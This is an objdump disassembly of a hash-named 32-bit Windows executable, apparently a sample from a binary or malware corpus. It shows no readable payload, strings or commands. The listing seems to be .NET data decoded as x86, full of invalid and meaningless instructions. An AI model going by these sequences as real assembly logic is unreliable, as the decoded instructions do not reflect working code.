
10feeb1b0fde32e0d3699bb8bb8558fafb03da45b7d204dd5b7200439a39cf2f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	loopne 0x40204d
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x274400,al
  402013:	add    BYTE PTR [eax],dh
  402015:	and    eax,DWORD PTR [eax]
  402017:	add    BYTE PTR [ecx],cl
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ecx],al
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [edx+0xb259d6f],dh
  402055:	(bad)  
  402056:	out    dx,eax
  402057:	and    al,BYTE PTR [ebx+0x4a]
  40205a:	jns    0x402031
  40205c:	test   eax,0xb976cd8f
  402061:	push   0x3d69030b
  402066:	(bad)  
  402067:	pusha  
  402068:	aad    0xf7
  40206a:	scas   eax,DWORD PTR es:[edi]
  40206b:	pop    ebx
  40206c:	push   0xe
  40206e:	cmp    al,0x10
  402070:	and    cl,ch
  402072:	push   es
  402073:	pop    ss
  402074:	fmulp  st(7),st
  402076:	jge    0x4020b6
  402078:	inc    esi
  402079:	ins    DWORD PTR es:[edi],dx
  40207a:	jns    0x402041
  40207c:	mov    ds:0xddc497d3,al
  402081:	ins    BYTE PTR es:[edi],dx
  402082:	push   ebp
  402083:	sub    esi,DWORD PTR [edx+0x17720ae2]
  402089:	cdq    
  40208a:	jns    0x402019
  40208c:	sbb    bh,BYTE PTR [edi+0x6f]
  40208f:	push   ebp
  402090:	dec    ebp
  402091:	mov    ds,WORD PTR [ecx+0x7d]
  402094:	add    eax,0x789f00d1
  402099:	icebp  
  40209a:	push   0x2075bddc
  40209f:	in     eax,0xe
  4020a1:	ror    BYTE PTR [esi-0x16],1
  4020a4:	shl    DWORD PTR [edx+0x66475927],cl
  4020aa:	inc    ebx
  4020ab:	add    DWORD PTR [edx+0x32],edx
  4020ae:	outs   dx,BYTE PTR ds:[esi]
  4020af:	scas   al,BYTE PTR es:[edi]
  4020b0:	imul   ebx,DWORD PTR [edi+0xf],0x40
  4020b4:	add    al,0x8c
  4020b6:	ret    0xb557
  4020b9:	add    esi,DWORD PTR [ebp+0x2889a9a7]
  4020bf:	data16 jb 0x4020f7
  4020c2:	mov    ecx,0x9de5056c
  4020c7:	(bad)  
  4020c8:	retf   0x8e62
  4020cb:	pop    edi
  4020cc:	dec    edx
  4020cd:	mov    esi,0x1f831f28
  4020d2:	push   ds
  4020d3:	test   DWORD PTR [ebx-0x55],edx
  4020d6:	sbb    ch,ah
  4020d8:	mov    cl,0x26
  4020da:	das    
  4020db:	scas   al,BYTE PTR es:[edi]
  4020dc:	or     esi,ebp
  4020de:	lock mov al,ds:0x82f05288
  4020e4:	out    0xdd,al
  4020e6:	aaa    
  4020e7:	push   cs
  4020e8:	dec    esi
  4020e9:	dec    edx
  4020ea:	mov    WORD PTR [edx-0x1d661c56],?
  4020f0:	xor    eax,0x6ca58389
  4020f5:	dec    esi
  4020f6:	ror    eax,0xfb
  4020f9:	fwait
  4020fa:	mov    ds:0x44723740,al
  4020ff:	ror    DWORD PTR [esi+0x1],1
  402102:	shr    BYTE PTR [ebp-0x3f10e741],1
  402108:	jp     0x402175
  40210a:	ins    DWORD PTR es:[edi],dx
  40210b:	push   edi
  40210c:	dec    esi
  40210d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40210e:	daa    
  40210f:	ins    BYTE PTR es:[edi],dx
  402110:	mov    cl,0x3d
  402112:	pop    esp
  402113:	xor    ecx,DWORD PTR [edx-0x76bc6649]
  402119:	pop    edi
  40211a:	xchg   esi,eax
  40211b:	xchg   edi,eax
  40211c:	ja     0x402112
  40211e:	fld    QWORD PTR [esi-0x72f64a7b]
  402124:	mov    dl,0x7f
  402126:	lgs    esi,FWORD PTR [ecx+edx*2]
  40212a:	dec    edx
  40212b:	xor    cl,BYTE PTR [eax-0x13ace62c]
  402131:	mov    al,0x2b
  402133:	add    DWORD PTR [ecx-0x2a],ebx
  402136:	or     esp,edx
  402138:	je     0x402163
  40213a:	test   DWORD PTR [edx+0x39],edx
  40213d:	push   esi
  40213e:	fist   WORD PTR [esi-0x6b]
  402141:	push   eax
  402142:	mov    ecx,0xa0e13501
  402147:	dec    esi
  402148:	loop   0x4021ba
  40214a:	jmp    esp
  40214c:	pop    ebx
  40214d:	nop
  40214e:	hlt    
  40214f:	sbb    bl,BYTE PTR [ebx]
  402151:	xor    BYTE PTR ds:0x10500,al
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR [edx],eax
  40215d:	sub    BYTE PTR [ebx],al
  40215f:	add    BYTE PTR [eax],al
  402161:	push   es
  402162:	sub    eax,0xa0200a
  402167:	add    BYTE PTR [eax],al
  402169:	sub    BYTE PTR ds:0x730a0000,dl
  40216f:	add    eax,0xa060000
  402174:	push   es
  402175:	pop    ss
  402176:	lea    ecx,[ebx]
  402178:	add    BYTE PTR [eax],al
  40217a:	add    DWORD PTR [ebx],edx
  40217c:	or     BYTE PTR [ecx],dl
  40217e:	or     BYTE PTR [esi],dl
  402180:	sub    BYTE PTR [edx],al
  402182:	add    BYTE PTR [eax],al
  402184:	push   es
  402185:	mov    ds:0x16730811,al
  40218a:	add    BYTE PTR [eax],al
  40218c:	or     cl,BYTE PTR [ebx]
  40218e:	jae    0x4021a7
  402190:	add    BYTE PTR [eax],al
  402192:	or     cl,BYTE PTR ds:0x187e09
  402198:	add    BYTE PTR [edx],cl
  40219a:	outs   dx,DWORD PTR ds:[esi]
  40219b:	sbb    DWORD PTR [eax],eax
  40219d:	add    BYTE PTR [edx],cl
  40219f:	or     DWORD PTR [edi+eax*1],ecx
  4021a2:	rol    BYTE PTR [edx],1
  4021a4:	add    BYTE PTR [eax],al
  4021a6:	add    DWORD PTR [eax],ebp
  4021a8:	sbb    al,BYTE PTR [eax]
  4021aa:	add    BYTE PTR [edx],cl
  4021ac:	or     BYTE PTR [edx+0x1],dh
  4021af:	add    BYTE PTR [eax],al
  4021b1:	jo     0x402222
  4021b3:	sbb    eax,DWORD PTR [eax]
  4021b5:	add    BYTE PTR [edx],cl
  4021b7:	es pop es
  4021b9:	outs   dx,DWORD PTR ds:[esi]
  4021ba:	sbb    al,0x0
  4021bc:	add    BYTE PTR [edx],cl
  4021be:	jle    0x4021c3
  4021c0:	add    BYTE PTR [eax],al
  4021c2:	add    al,0x73
  4021c4:	sbb    eax,0x6f0a0000
  4021c9:	push   ds
  4021ca:	add    BYTE PTR [eax],al
  4021cc:	or     al,BYTE PTR [edi]
  4021ce:	outs   dx,DWORD PTR ds:[esi]
  4021cf:	pop    ds
  4021d0:	add    BYTE PTR [eax],al
  4021d2:	or     bh,BYTE PTR [esi+0x1]
  4021d5:	add    BYTE PTR [eax],al
  4021d7:	add    al,0x28
  4021d9:	and    BYTE PTR [eax],al
  4021db:	add    BYTE PTR [edx],cl
  4021dd:	sbb    BYTE PTR [ebp+0x100000e],cl
  4021e3:	adc    ecx,DWORD PTR [ecx]
  4021e5:	adc    DWORD PTR [ecx],ecx
  4021e7:	push   ss
  4021e8:	sub    BYTE PTR [ecx],ah
  4021ea:	add    BYTE PTR [eax],al
  4021ec:	or     bh,BYTE PTR [esi+0x2]
  4021ef:	add    BYTE PTR [eax],al
  4021f1:	add    al,0xfe
  4021f3:	push   es
  4021f4:	and    al,BYTE PTR [eax]
  4021f6:	add    BYTE PTR [edx],cl
  4021f8:	jae    0x40221d
  4021fa:	add    BYTE PTR [eax],al
  4021fc:	or     ch,BYTE PTR [edi+0x24]
  4021ff:	add    BYTE PTR [eax],al
  402201:	or     ah,BYTE PTR [edx+0x6170911]
  402207:	outs   dx,DWORD PTR ds:[esi]
  402208:	pop    es
  402209:	add    BYTE PTR [eax],al
  40220b:	push   es
  40220c:	mov    ds:0x25280911,al
  402211:	add    BYTE PTR [eax],al
  402213:	or     ah,BYTE PTR [esi]
  402215:	pop    es
  402216:	outs   dx,DWORD PTR ds:[esi]
  402217:	add    BYTE PTR es:[eax],al
  40221a:	or     bl,dh
  40221c:	or     al,BYTE PTR [edi]
  40221e:	sub    al,0x6
  402220:	pop    es
  402221:	outs   dx,DWORD PTR ds:[esi]
  402222:	daa    
  402223:	add    BYTE PTR [eax],al
  402225:	or     bl,ah
  402227:	fidiv  WORD PTR [ebx]
  402229:	adc    eax,DWORD PTR [ecx+edx*1]
  40222c:	add    al,0x28
  40222e:	sub    BYTE PTR [eax],al
  402230:	add    BYTE PTR [edx],cl
  402232:	sbb    BYTE PTR [ebx],dl
  402234:	pop    es
  402235:	fisub  WORD PTR [edi]
  402237:	adc    eax,DWORD PTR ds:0x28280511
  40223d:	add    BYTE PTR [eax],al
  40223f:	or     ah,BYTE PTR [eax]
  402241:	out    0x0,eax
  402243:	add    BYTE PTR [eax],al
  402245:	adc    eax,DWORD PTR [edi]
  402247:	ficom  WORD PTR ds:0x6110613
  40224d:	jb     0x402252
  40224f:	add    BYTE PTR [eax],al
  402251:	jo     0x40227b
  402253:	sub    DWORD PTR [eax],eax
  402255:	add    BYTE PTR [edx],cl
  402257:	adc    eax,0x2de0713
  40225c:	push   ss
  40225d:	sub    dl,BYTE PTR [ecx]
  40225f:	pop    es
  402260:	sub    al,BYTE PTR [eax]
  402262:	add    BYTE PTR [eax],al
  402264:	add    DWORD PTR [eax+eax*1],esi
  402267:	add    BYTE PTR [edx],al
  402269:	add    BYTE PTR [edx],dh
  40226b:	add    BYTE PTR [edi+0xa00c1],cl
  402271:	add    BYTE PTR [eax],al
  402273:	add    BYTE PTR [eax],al
  402275:	add    BYTE PTR [eax],al
  402277:	add    ch,cl
  402279:	int    0x0
  40227b:	push   cs
  40227c:	cmp    DWORD PTR [eax],eax
  40227e:	add    BYTE PTR [ecx],al
  402280:	add    BYTE PTR [eax],al
  402282:	add    BYTE PTR [eax],al
  402284:	int    0xdb
  402286:	add    BYTE PTR [edx],dl
  402288:	cmp    al,BYTE PTR [eax]
  40228a:	add    BYTE PTR [ecx],al
  40228c:	add    BYTE PTR [eax],al
  40228e:	add    BYTE PTR [eax],al
  402290:	int    0xed
  402292:	add    BYTE PTR [ebx],dl
  402294:	cmp    BYTE PTR [eax],al
  402296:	add    BYTE PTR [ecx],al
  402298:	adc    esi,DWORD PTR [eax]
  40229a:	push   es
  40229b:	add    BYTE PTR [esi+0x0],dl
  40229e:	add    BYTE PTR [eax],al
  4022a0:	add    al,BYTE PTR [eax]
  4022a2:	add    BYTE PTR [ecx],dl
  4022a4:	jle    0x4022d0
  4022a6:	add    BYTE PTR [eax],al
  4022a8:	or     cl,BYTE PTR [edx]
  4022aa:	sub    BYTE PTR [ebx],ch
  4022ac:	add    BYTE PTR [eax],al
  4022ae:	or     dh,BYTE PTR [edx+0x75]
  4022b1:	add    BYTE PTR [eax],al
  4022b3:	jo     0x4022cd
  4022b5:	lea    eax,[ecx]
  4022b7:	add    BYTE PTR [eax],al
  4022b9:	add    DWORD PTR [ebx],ecx
  4022bb:	pop    es
  4022bc:	push   ss
  4022bd:	jb     0x402242
  4022bf:	add    BYTE PTR [eax],al
  4022c1:	jo     0x402265
  4022c3:	pop    es
  4022c4:	pop    ss
  4022c5:	jg     0x4022c8
  4022c7:	add    BYTE PTR [eax],al
  4022c9:	add    al,0x72
  4022cb:	stc    
  4022cc:	add    BYTE PTR [eax],al
  4022ce:	jo     0x4022f8
  4022d0:	sub    al,0x0
  4022d2:	add    BYTE PTR [edx],cl
  4022d4:	mov    ds:0x2d2807,al
  4022d9:	add    BYTE PTR [edx],cl
  4022db:	or     bl,BYTE PTR [edx]
  4022dd:	jb     0x4022dc
  4022df:	add    BYTE PTR [eax],al
  4022e1:	jo     0x4022fa
  4022e3:	lea    eax,[ecx]
  4022e5:	add    BYTE PTR [eax],al
  4022e7:	add    DWORD PTR [eax+ecx*1],ecx
  4022ea:	push   ss
  4022eb:	push   es
  4022ec:	mov    ds:0x2e2808,al
  4022f1:	add    BYTE PTR [edx],cl
  4022f3:	push   es
  4022f4:	jae    0x402325
  4022f6:	add    BYTE PTR [eax],al
  4022f8:	or     ch,BYTE PTR [edx]
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	sbb    esi,DWORD PTR [eax]
  4022fe:	add    al,0x0
  402300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402301:	add    BYTE PTR [eax],al
  402303:	add    BYTE PTR [ebx],al
  402305:	add    BYTE PTR [eax],al
  402307:	adc    DWORD PTR [edx],eax
  402309:	mov    gs,WORD PTR [ecx+0x19]
  40230c:	or     DWORD PTR cs:[edx],eax
  40230f:	mov    gs,WORD PTR [ecx+0x1a]
  402312:	inc    eax
  402313:	mov    al,BYTE PTR [eax]
  402315:	add    BYTE PTR [eax],al
  402317:	add    dl,BYTE PTR [esi]
  402319:	call   0x800a:0x3073
  402320:	add    eax,DWORD PTR [eax]
  402322:	add    BYTE PTR [edx+eax*1],al
  402325:	pop    ss
  402326:	call   0x280a:0x3128
  40232d:	xor    al,BYTE PTR [eax]
  40232f:	add    BYTE PTR [edx],cl
  402331:	add    BYTE PTR [edx],0x0
  402334:	add    BYTE PTR [edx+eax*1],al
  402337:	sbb    BYTE PTR [edx+0x3328],bl
  40233d:	or     al,BYTE PTR [eax+0x4000001]
  402343:	add    cl,BYTE PTR [esi+0x44331a69]
  402349:	add    bl,BYTE PTR [ecx]
  40234b:	call   0x6f0a:0x2b28
  402352:	xor    al,0x0
  402354:	add    BYTE PTR [edx],cl
  402356:	sub    BYTE PTR ds:0xa0a0000,dh
  40235c:	jb     0x40237f
  40235e:	add    DWORD PTR [eax],eax
  402360:	jo     0x402379
  402362:	lea    eax,[ecx]
  402364:	add    BYTE PTR [eax],al
  402366:	add    DWORD PTR [ebx],edx
  402368:	add    al,0x11
  40236a:	add    al,0x16
  40236c:	push   es
  40236d:	mov    WORD PTR [esi],?
  40236f:	add    BYTE PTR [eax],al
  402371:	add    DWORD PTR [edx+0x36280411],esp
  402377:	add    BYTE PTR [eax],al
  402379:	or     al,BYTE PTR [esi]
  40237b:	jae    0x4023b4
  40237d:	add    BYTE PTR [eax],al
  40237f:	or     cl,BYTE PTR [ebx]
  402381:	pop    es
  402382:	sub    BYTE PTR [eax],bh
  402384:	add    BYTE PTR [eax],al
  402386:	or     al,BYTE PTR [edi]
  402388:	sub    BYTE PTR [ecx],bh
  40238a:	add    BYTE PTR [eax],al
  40238c:	or     bl,dh
  40238e:	adc    BYTE PTR [eax+ecx*1],cl
  402391:	jb     0x4023e6
  402393:	add    DWORD PTR [eax],eax
  402395:	jo     0x4023bf
  402397:	sub    DWORD PTR [eax],eax
  402399:	add    BYTE PTR [edx],cl
  40239b:	push   ss
  40239c:	or     eax,0x2a170ede
  4023a1:	jb     0x40232a
  4023a3:	add    DWORD PTR [eax],eax
  4023a5:	jo     0x4023cf
  4023a7:	cmp    al,BYTE PTR [eax]
  4023a9:	add    BYTE PTR [edx],cl
  4023ab:	push   ss
  4023ac:	sub    cl,BYTE PTR [ecx]
  4023ae:	sub    al,BYTE PTR [eax]
  4023b0:	add    DWORD PTR [eax],edx
  4023b2:	add    BYTE PTR [eax],al
  4023b4:	add    BYTE PTR [eax],al
  4023b6:	(bad)  
  4023b8:	js     0x402341
  4023ba:	add    BYTE PTR [eax],dl
  4023bc:	cmp    BYTE PTR [eax],al
  4023be:	add    BYTE PTR [ecx],al
  4023c0:	push   ds
  4023c1:	add    ch,BYTE PTR [eax]
  4023c3:	cmp    eax,DWORD PTR [eax]
  4023c5:	add    BYTE PTR [edx],cl
  4023c7:	sub    dh,BYTE PTR [esi+0x2]
  4023ca:	sub    BYTE PTR [ebx],bh
  4023cc:	add    BYTE PTR [eax],al
  4023ce:	or     al,BYTE PTR [edx]
  4023d0:	jae    0x40240f
  4023d2:	add    BYTE PTR [eax],al
  4023d4:	or     bh,BYTE PTR [ebp+0x4]
  4023d7:	add    BYTE PTR [eax],al
  4023d9:	add    al,0x2
  4023db:	jae    0x40241b
  4023dd:	add    BYTE PTR [eax],al
  4023df:	or     bh,BYTE PTR [ebp+0x5]
  4023e2:	add    BYTE PTR [eax],al
  4023e4:	add    al,0x2a
  4023e6:	add    BYTE PTR [eax],al
  4023e8:	or     esi,DWORD PTR [eax]
  4023ea:	add    al,BYTE PTR [eax]
  4023ec:	adc    DWORD PTR [eax],eax
  4023ee:	add    BYTE PTR [eax],al
  4023f0:	add    BYTE PTR [eax],al
  4023f2:	add    BYTE PTR [eax],al
  4023f4:	add    dl,BYTE PTR [esi]
  4023f6:	outs   dx,DWORD PTR ds:[esi]
  4023f7:	or     al,0x0
  4023f9:	add    BYTE PTR [esi],al
  4023fb:	fiadd  WORD PTR [edi]
  4023fd:	add    ch,BYTE PTR [eax]
  4023ff:	aas    
  402400:	add    BYTE PTR [eax],al
  402402:	or     bl,ah
  402404:	sub    al,BYTE PTR [eax]
  402406:	add    BYTE PTR [eax],al
  402408:	add    DWORD PTR [eax],edx
  40240a:	add    BYTE PTR [eax],al
  40240c:	add    al,BYTE PTR [eax]
  40240e:	add    BYTE PTR [eax],al
  402410:	or     DWORD PTR [ecx],ecx
  402412:	add    BYTE PTR [edi],al
  402414:	add    BYTE PTR [eax],al
  402416:	add    BYTE PTR [eax],al
  402418:	xor    al,BYTE PTR [edx]
  40241a:	jnp    0x402420
  40241c:	add    BYTE PTR [eax],al
  40241e:	add    al,0x6f
  402420:	inc    eax
  402421:	add    BYTE PTR [eax],al
  402423:	or     ch,BYTE PTR [edx]
  402425:	cmp    al,BYTE PTR [edx]
  402427:	pop    ss
  402428:	outs   dx,DWORD PTR ds:[esi]
  402429:	or     al,0x0
  40242b:	add    BYTE PTR [esi],al
  40242d:	add    ch,BYTE PTR [eax]
  40242f:	inc    ecx
  402430:	add    BYTE PTR [eax],al
  402432:	or     ch,BYTE PTR [edx]
  402434:	data16 add bh,BYTE PTR [ebx+0x4]
  402438:	add    BYTE PTR [eax],al
  40243a:	add    al,0x17
  40243c:	outs   dx,DWORD PTR ds:[esi]
  40243d:	inc    edx
  40243e:	add    BYTE PTR [eax],al
  402440:	or     ch,BYTE PTR ds:0x1f9720a
  402446:	add    BYTE PTR [eax+0x28],dh
  402449:	cmp    al,BYTE PTR [eax]
  40244b:	add    BYTE PTR [edx],cl
  40244d:	sub    al,BYTE PTR [eax]
  40244f:	add    BYTE PTR [ebx],bl
  402451:	xor    BYTE PTR [edi],al
  402453:	add    BYTE PTR [esi],ch
  402455:	add    DWORD PTR [eax],eax
  402457:	add    BYTE PTR [eax+eax*1],al
  40245a:	add    BYTE PTR [ecx],dl
  40245c:	sub    BYTE PTR [ebx+0x0],al
  40245f:	add    BYTE PTR [edx],cl
  402461:	outs   dx,DWORD PTR ds:[esi]
  402462:	add    DWORD PTR [eax],eax
  402464:	add    BYTE PTR [ebx],ch
  402466:	or     al,BYTE PTR [ebx]
  402468:	add    al,0x5
  40246a:	push   cs
  40246b:	add    al,0xe
  40246d:	add    eax,0x117306
  402472:	add    BYTE PTR [esi],al
  402474:	push   es
  402475:	jae    0x402486
  402477:	add    BYTE PTR [eax],al
  402479:	push   es
  40247a:	jae    0x4024c1
  40247c:	add    BYTE PTR [eax],al
  40247e:	or     cl,BYTE PTR [ebx]
  402480:	pop    es
  402481:	add    bh,BYTE PTR [ebx+0x5]
  402484:	add    BYTE PTR [eax],al
  402486:	add    al,0x6f
  402488:	inc    esi
  402489:	add    BYTE PTR [eax],al
  40248b:	or     al,BYTE PTR [esi]
  40248d:	jae    0x40249c
  40248f:	add    BYTE PTR [eax],al
  402491:	push   es
  402492:	outs   dx,DWORD PTR ds:[esi]
  402493:	add    al,BYTE PTR [eax]
  402495:	add    BYTE PTR [ebx],ch
  402497:	fucomp st(5)
  402499:	add    BYTE PTR [eax],al
  40249b:	add    BYTE PTR [eax+ecx*1],cl
  40249e:	jb     0x402430
  4024a0:	add    al,BYTE PTR [eax]
  4024a2:	jo     0x4024cc
  4024a4:	sub    DWORD PTR [eax],eax
  4024a6:	add    BYTE PTR [edx],cl
  4024a8:	or     BYTE PTR [ebx+0x48],dh
  4024ab:	add    BYTE PTR [eax],al
  4024ad:	or     cl,BYTE PTR [eax]
  4024af:	outs   dx,DWORD PTR ds:[esi]
  4024b0:	dec    ecx
  4024b1:	add    BYTE PTR [eax],al
  4024b3:	or     dh,BYTE PTR [ebx+0x4a]
  4024b6:	add    BYTE PTR [eax],al
  4024b8:	or     bh,BYTE PTR [edx+0xd]
  4024bb:	or     DWORD PTR [edi+0x4b],ebp
  4024be:	add    BYTE PTR [eax],al
  4024c0:	or     ch,BYTE PTR [edi+0x4c]
  4024c3:	add    BYTE PTR [eax],al
  4024c5:	or     ch,BYTE PTR [edi+0x4d]
  4024c8:	add    BYTE PTR [eax],al
  4024ca:	or     dl,BYTE PTR [ebx]
  4024cc:	pop    es
  4024cd:	sub    esi,DWORD PTR [ecx+0x11]
  4024d0:	pop    es
  4024d1:	outs   dx,DWORD PTR ds:[esi]
  4024d2:	dec    esi
  4024d3:	add    BYTE PTR [eax],al
  4024d5:	or     dl,BYTE PTR [ebx]
  4024d7:	add    al,0x11
  4024d9:	add    al,0x75
  4024db:	dec    edi
  4024dc:	add    BYTE PTR [eax],al
  4024de:	add    DWORD PTR [ecx+ebp*1],ebp
  4024e1:	adc    DWORD PTR [esi*2+0x100004f],eax
  4024e8:	adc    eax,DWORD PTR ds:0x90720511
  4024ee:	add    al,BYTE PTR [eax]
  4024f0:	jo     0x40251a
  4024f2:	sub    DWORD PTR [eax],eax
  4024f4:	add    BYTE PTR [edx],cl
  4024f6:	adc    DWORD PTR ds:0x4873,eax
  4024fc:	or     dl,BYTE PTR [ecx]
  4024fe:	add    eax,0x496f
  402503:	or     dh,BYTE PTR [ebx+0x4a]
  402506:	add    BYTE PTR [eax],al
  402508:	or     bh,BYTE PTR [edx+0x11]
  40250b:	add    al,0x75
  40250d:	push   eax
  40250e:	add    BYTE PTR [eax],al
  402510:	add    DWORD PTR [ecx*1+0x323721b],ebp
  402517:	add    BYTE PTR [eax+0x28],dh
  40251a:	dec    edi
  40251b:	add    BYTE PTR [eax],al
  40251d:	or     ch,BYTE PTR [ebx]
  40251f:	and    BYTE PTR [ecx],dl
  402521:	add    al,0x72
  402523:	imul   eax,DWORD PTR [ebx],0x29287000
  402529:	add    BYTE PTR [eax],al
  40252b:	or     dl,BYTE PTR [ecx]
  40252d:	add    al,0x73
  40252f:	dec    eax
  402530:	add    BYTE PTR [eax],al
  402532:	or     dl,BYTE PTR [ecx]
  402534:	add    al,0x6f
  402536:	dec    ecx
  402537:	add    BYTE PTR [eax],al
  402539:	or     dh,BYTE PTR [ebx+0x4a]
  40253c:	add    BYTE PTR [eax],al
  40253e:	or     bh,BYTE PTR [edx+0x11]
  402541:	pop    es
  402542:	outs   dx,DWORD PTR ds:[esi]
  402543:	push   eax
  402544:	add    BYTE PTR [eax],al
  402546:	or     ch,BYTE PTR ds:0x110cde86
  40254c:	pop    es
  40254d:	sub    al,0x7
  40254f:	adc    DWORD PTR [edi],eax
  402551:	outs   dx,DWORD PTR ds:[esi]
  402552:	daa    
  402553:	add    BYTE PTR [eax],al
  402555:	or     bl,ah
  402557:	fidiv  WORD PTR [eax]
  402559:	sbb    esi,DWORD PTR es:[edx+0x23]
  40255d:	add    eax,DWORD PTR [eax]
  40255f:	jo     0x402589
  402561:	dec    edi
  402562:	add    BYTE PTR [eax],al
  402564:	or     bl,dh
  402566:	and    dl,BYTE PTR [ebx]
  402568:	push   es
  402569:	adc    DWORD PTR [esi],eax
  40256b:	jb     0x4025d6
  40256d:	add    eax,DWORD PTR [eax]
  40256f:	jo     0x402599
  402571:	sub    DWORD PTR [eax],eax
  402573:	add    BYTE PTR [edx],cl
  402575:	adc    DWORD PTR [esi],eax
  402577:	jae    0x4025c1
  402579:	add    BYTE PTR [eax],al
  40257b:	or     dl,BYTE PTR [ecx]
  40257d:	push   es
  40257e:	outs   dx,DWORD PTR ds:[esi]
  40257f:	dec    ecx
  402580:	add    BYTE PTR [eax],al
  402582:	or     dh,BYTE PTR [ebx+0x4a]
  402585:	add    BYTE PTR [eax],al
  402587:	or     bh,BYTE PTR [edx+0x2a]
  40258a:	add    BYTE PTR [eax],al
  40258c:	add    DWORD PTR [eax+0x0],eax
  40258f:	add    BYTE PTR [eax],al
  402591:	add    BYTE PTR [ebx],cl
  402593:	add    BYTE PTR ds:0x4f1e0040,dh
  402599:	add    BYTE PTR [eax],al
  40259b:	add    DWORD PTR [edx],eax
  40259d:	add    BYTE PTR [ecx+0x0],dh
  4025a0:	jle    0x402591
  4025a2:	add    BYTE PTR [eax+eax*1],cl
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	add    BYTE PTR [eax],al
  4025a9:	add    BYTE PTR [ebx],cl
  4025ab:	add    BYTE PTR ds:0x4c9f005e,dh
  4025b1:	add    BYTE PTR [eax],al
  4025b3:	add    DWORD PTR [eax],eax
  4025b5:	add    BYTE PTR [ebx],cl
  4025b7:	add    BYTE PTR ds:0x500e00fd,dh
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	add    DWORD PTR [eax],eax
  4025c1:	add    BYTE PTR [ebx],cl
  4025c3:	add    BYTE PTR ds:0x3822010b,dh
  4025c9:	add    BYTE PTR [eax],al
  4025cb:	add    DWORD PTR [ebx],ebx
  4025cd:	xor    BYTE PTR [edx],al
  4025cf:	add    BYTE PTR [ebp+0x0],dh
  4025d2:	add    BYTE PTR [eax],al
  4025d4:	add    eax,0x2110000
  4025d9:	jnp    0x4025e1
  4025db:	add    BYTE PTR [eax],al
  4025dd:	add    al,0x2d
  4025df:	ins    BYTE PTR es:[edi],dx
  4025e0:	add    bh,BYTE PTR [ebx+0x5]
  4025e3:	add    BYTE PTR [eax],al
  4025e5:	add    al,0x2c
  4025e7:	add    bh,BYTE PTR fs:[ebx+0x5]
  4025eb:	add    BYTE PTR [eax],al
  4025ed:	add    al,0x6f
  4025ef:	push   ecx
  4025f0:	add    BYTE PTR [eax],al
  4025f2:	or     ch,BYTE PTR ds:0x57b0257
  4025f8:	add    BYTE PTR [eax],al
  4025fa:	add    al,0x6f
  4025fc:	push   edx
  4025fd:	add    BYTE PTR [eax],al
  4025ff:	or     bl,dh
  402601:	dec    edx
  402602:	or     al,BYTE PTR [esi]
  402604:	jb     0x402602
  402606:	add    eax,DWORD PTR [eax]
  402608:	jo     0x402632
  40260a:	sub    DWORD PTR [eax],eax
  40260c:	add    BYTE PTR [edx],cl
  40260e:	fidivr WORD PTR [ebx+ecx*1]
  402611:	pop    es
  402612:	outs   dx,DWORD PTR ds:[esi]
  402613:	dec    ebx
  402614:	add    BYTE PTR [eax],al
  402616:	or     ch,BYTE PTR [edi+0x4c]
  402619:	add    BYTE PTR [eax],al
  40261b:	or     ch,BYTE PTR [edi+0x4d]
  40261e:	add    BYTE PTR [eax],al
  402620:	or     cl,BYTE PTR ds:0x6f09122b
  402626:	dec    esi
  402627:	add    BYTE PTR [eax],al
  402629:	or     cl,BYTE PTR [eax+ecx*1]
  40262c:	jb     0x4025bf
  40262e:	add    al,0x0
  402630:	jo     0x40265a
  402632:	sub    DWORD PTR [eax],eax
  402634:	add    BYTE PTR [edx],cl
  402636:	or     DWORD PTR [edi+0x50],ebp
  402639:	add    BYTE PTR [eax],al
  40263b:	or     ch,BYTE PTR ds:0x90adee6
  402641:	sub    al,0x6
  402643:	or     DWORD PTR [edi+0x27],ebp
  402646:	add    BYTE PTR [eax],al
  402648:	or     bl,ah
  40264a:	fiadd  WORD PTR [eax]
  40264c:	sub    al,BYTE PTR [eax]
  40264e:	add    BYTE PTR [eax],al
  402650:	add    DWORD PTR [eax],ebp
  402652:	add    BYTE PTR [eax],al
  402654:	add    BYTE PTR [eax],al
  402656:	sbb    eax,0x2a0d00
  40265b:	push   cs
  40265c:	push   edx
  40265d:	add    BYTE PTR [eax],al
  40265f:	add    DWORD PTR [edx],eax
  402661:	add    BYTE PTR [edx+0x0],cl
  402664:	push   ds
  402665:	push   0xa00
  40266a:	add    BYTE PTR [eax],al
  40266c:	add    BYTE PTR [eax],al
  40266e:	sbb    eax,0x380d00
  402673:	cmp    al,0x4c
  402675:	add    BYTE PTR [eax],al
  402677:	add    DWORD PTR [edx+0x67b02],ebx
  40267d:	add    BYTE PTR [ebp*1+0x132c031d],al
  402684:	add    bh,BYTE PTR [ebx+0x5]
  402687:	add    BYTE PTR [eax],al
  402689:	add    al,0x2c
  40268b:	or     eax,DWORD PTR [edx]
  40268d:	jnp    0x402694
  40268f:	add    BYTE PTR [eax],al
  402691:	add    al,0x6f
  402693:	push   ebx
  402694:	add    BYTE PTR [eax],al
  402696:	or     al,BYTE PTR [edx]
  402698:	pop    ss
  402699:	jge    0x4026a1
  40269b:	add    BYTE PTR [eax],al
  40269d:	add    al,0x2a
  40269f:	xchg   BYTE PTR [edx],al
  4026a1:	sub    BYTE PTR [ebx],bh
  4026a3:	add    BYTE PTR [eax],al
  4026a5:	or     al,BYTE PTR [ebx]
  4026a7:	sub    eax,0x50f7210
  4026ac:	add    BYTE PTR [eax+0x73],dh
  4026af:	push   esp
  4026b0:	add    BYTE PTR [eax],al
  4026b2:	or     ch,BYTE PTR [eax]
  4026b4:	push   ebp
  4026b5:	add    BYTE PTR [eax],al
  4026b7:	or     ah,BYTE PTR [esi]
